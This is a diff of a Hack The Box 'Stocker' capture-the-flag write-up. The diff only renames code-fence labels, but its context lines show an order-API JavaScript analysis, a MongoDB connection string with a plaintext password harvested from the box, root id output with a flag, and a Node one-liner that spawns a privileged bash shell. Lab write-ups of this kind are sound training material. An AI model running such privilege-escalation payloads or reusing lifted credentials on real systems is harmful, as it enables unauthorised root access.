@@ -214,7 +214,7 @@ Success!
 
 It appears there is some exposed JS in the source of the page:
 
-```JS
+```javascript
     const $ = (selector) => document.querySelector(selector);
 
     const basket = [];
@@ -330,7 +330,7 @@ Looking closer into the second part of the code, we can see that:
 
 1. When submitting an order, a POST API call is made to `/api/order`. The POST request has a JSON body containing the values stored in the `basket` variable. 
 
-```JS
+```javascript
 .
 .
 .
@@ -349,7 +349,7 @@ submitPurchase.addEventListener("click", () => {
 
 2. Then, the result from the response is taken. A check for the success of the response is made. If the response is different from `success`, then the rest of the code won't be executed.
 
-```JS
+```javascript
 	.then((response) => response.json())
 	.then((response) => {
 		if (!response.success) return alert("Something went wrong processing your order!");
@@ -359,7 +359,7 @@ submitPurchase.addEventListener("click", () => {
 
 3. However, on success, the value of the variable `purchaseOrderLink` is set to `/api/po/<OrderID>`.
 
-```JS
+```javascript
 		purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);
 
 		$("#order-id").textContent = response.orderId;
@@ -451,7 +451,7 @@ There I found the MongoDB credentials:
 
 ![](blog/htb_m/Stocker/Pasted image 20230205174319.png)
 
-```JS
+```javascript
 // TODO: Configure loading from dotenv for production
 const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
 ```
@@ -502,7 +502,7 @@ uid=0(root) gid=0(root) groups=0(root)
 37867fe058775c692ccf699e2499edb3
 ```
 
-```JS
+```javascript
 require("child_process").spawn("/bin/bash", ["-p"], {stdio: [0, 1, 2]})
 ```
 
